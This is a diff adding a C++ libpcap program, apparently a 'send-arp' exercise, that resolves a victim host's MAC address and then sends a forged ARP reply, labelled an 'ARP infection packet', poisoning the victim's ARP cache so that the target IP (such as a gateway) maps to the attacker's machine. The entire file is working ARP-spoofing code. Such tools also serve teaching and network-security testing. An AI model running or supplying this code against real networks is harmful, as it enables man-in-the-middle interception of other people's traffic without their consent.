@@ -1,0 +1,139 @@
+#include <cstdio>
+#include <pcap.h>
+#include <unistd.h>
+#include <netinet/ip.h>
+#include "ethhdr.h"
+#include "arphdr.h"
+
+#include <sys/ioctl.h>
+#include <net/if.h>
+
+#pragma pack(push, 1)
+struct EthArpPacket final {
+    EthHdr eth_;
+    ArpHdr arp_;
+};
+#pragma pack(pop)
+
+void usage() {
+    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
+    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
+}
+
+int WaitForReply(pcap_t* handle, Mac myMac, Ip targetIP, Mac* senderMac) {
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) {
+            printf("Failed to capture packet\n");
+            return -1;
+        }
+        EthArpPacket* recvPacket = (EthArpPacket*)packet;
+
+        if (recvPacket->eth_.type() == EthHdr::Arp && recvPacket->arp_.op() == htons(ArpHdr::Reply) && recvPacket->arp_.sip() == targetIP && recvPacket->arp_.smac() != myMac) {
+            *senderMac = recvPacket->arp_.smac();
+            return 0;
+        }
+    }
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 4 || argc % 2 == 1) {
+        usage();
+        return -1;
+    }
+
+    char* dev = argv[1];
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return -1;
+    }
+
+    // Get my MAC Address
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof(ifr));
+    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
+
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        fprintf(stderr, "socket open error\n");
+        return -1;
+    }
+    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
+        fprintf(stderr, "ioctl SIOCGIFHWADDR error\n");
+        return -1;
+    }
+
+    Mac myMac((uint8_t*)ifr.ifr_hwaddr.sa_data);
+    printf("My Mac address : %s\n", myMac.operator std::string().c_str());
+    ::close(sock);
+
+    for (int i = 2; i < argc; i += 2) {
+        printf("\n[*] Target: %s -> %s\n", argv[i], argv[i + 1]);
+
+        Ip senderIP(argv[i]);
+        Ip targetIP(argv[i + 1]);
+
+        // Send ARP request
+        EthArpPacket requestPacket;
+        requestPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+        requestPacket.eth_.smac_ = myMac;
+        requestPacket.eth_.type_ = htons(EthHdr::Arp);
+
+        requestPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+        requestPacket.arp_.pro_ = htons(EthHdr::Ip4);
+        requestPacket.arp_.hln_ = Mac::SIZE;
+        requestPacket.arp_.pln_ = Ip::SIZE;
+        requestPacket.arp_.op_ = htons(ArpHdr::Request);
+        requestPacket.arp_.smac_ = myMac;
+        requestPacket.arp_.sip_ = htonl(Ip("0.0.0.0"));
+        requestPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
+        requestPacket.arp_.tip_ = htonl(senderIP);
+
+        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&requestPacket), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+            return -1;
+        }
+
+        // Receive ARP reply
+        Mac senderMac;
+        if (WaitForReply(handle, myMac, senderIP, &senderMac) == -1) {
+            printf("Failed to get target's MAC address\n");
+            return -1;
+        }
+
+        printf("Sender %s's MAC address: %s\n", std::string(senderIP).c_str(), std::string(senderMac).c_str());
+
+        // Send ARP infection packet
+        EthArpPacket infectionPacket;
+        infectionPacket.eth_.dmac_ = senderMac;
+        infectionPacket.eth_.smac_ = myMac;
+        infectionPacket.eth_.type_ = htons(EthHdr::Arp);
+
+        infectionPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+        infectionPacket.arp_.pro_ = htons(EthHdr::Ip4);
+        infectionPacket.arp_.hln_ = Mac::SIZE;
+        infectionPacket.arp_.pln_ = Ip::SIZE;
+        infectionPacket.arp_.op_ = htons(ArpHdr::Reply);
+        infectionPacket.arp_.smac_ = myMac;
+        infectionPacket.arp_.sip_ = htonl(targetIP);
+        infectionPacket.arp_.tmac_ = senderMac;
+        infectionPacket.arp_.tip_ = htonl(senderIP);
+
+        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infectionPacket), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+            return -1;
+        }
+
+        printf("[*] ARP infection packet sent!\n");
+    }
+
+    pcap_close(handle);
+}
+
